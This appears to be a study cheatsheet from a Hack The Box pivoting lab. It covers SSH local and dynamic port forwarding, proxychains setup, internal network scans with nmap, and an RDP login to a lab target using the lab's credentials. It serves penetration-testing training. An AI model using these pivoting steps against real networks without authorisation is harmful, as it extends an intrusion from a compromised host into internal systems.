
**When to use:** You've compromised a host that has access to an internal network you can't reach directly.

---

## Topology (always map this first)

```
Attack Host ──── [internet] ──── Pivot Host ──── [internal net]
10.10.15.x                       10.129.x.x        172.16.5.0/23
                                  └── ens192 (external)
                                  └── ens224 (internal)
```

> **Pivot host = compromised host with 2 NICs** Always verify with `ifconfig` or `ip a` — you're looking for a second interface.

---

## Local Port Forward (`-L`)

**When:** You know exactly which port/service you want from the pivot host.

bash

```bash
ssh -L <local_port>:localhost:<remote_port> user@pivot_host
```

**Example — MySQL:**

bash

```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

Now hitting `localhost:1234` on your attack host → traffic goes through SSH → arrives at MySQL:3306 on the pivot host.

**Multiple ports at once:**

bash

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

**Verify it's working:**

bash

```bash
netstat -antp | grep 1234
nmap -sV -p1234 localhost
```

---

## Dynamic Port Forward (`-D`) + Proxychains

**When:** You don't know what's behind the pivot host — you want to scan the whole internal network.

### Step 1 — open SOCKS listener

bash

```bash
ssh -D 9050 ubuntu@10.129.202.64
```

SSH now listens on `localhost:9050`. Everything you send there goes through the pivot host into the internal network.

### Step 2 — configure proxychains

bash

```bash
tail -4 /etc/proxychains.conf
# must have:
socks4  127.0.0.1 9050
```

### Step 3 — run tools through proxychains

bash

```bash
# ping sweep
proxychains nmap -v -sn 172.16.5.1-200

# port scan (must use -sT and -Pn — no half-open scans through SOCKS)
proxychains nmap -v -Pn -sT 172.16.5.19

# RDP
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

# Metasploit
proxychains msfconsole
```

---

## Proxychains Limitations

|Works|Doesn't work|
|---|---|
|TCP connect scan (`-sT`)|SYN/half-open scan (`-sS`)|
|Full TCP connections|UDP|
|ICMP to Linux hosts|ICMP to Windows (Defender blocks it)|

→ **Always use `-Pn -sT` when scanning through proxychains.**

---

## Reading Proxychains Output

```
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK      ← port OPEN
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<--timeout     ← port CLOSED/filtered
```

---

## Lab Cheatsheet (HTB Pivoting module)

bash

```bash
# 1. SSH into pivot host
ssh ubuntu@10.129.x.x  # pass: HTB_@cademy_stdnt!

# 2. Check interfaces
ifconfig

# 3. Open dynamic tunnel
ssh -D 9050 ubuntu@10.129.x.x

# 4. Scan internal network
proxychains nmap -Pn -sT 172.16.5.19

# 5. RDP into Windows target
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## Mental Model

> `-L` = direct dial — you know exactly who you're calling. `-D` = switchboard — everything routes through it, you pick the destination after.

---

## Tags

`#htb` `#cpts` `#pivoting` `#ssh` `#socks` `#proxychains`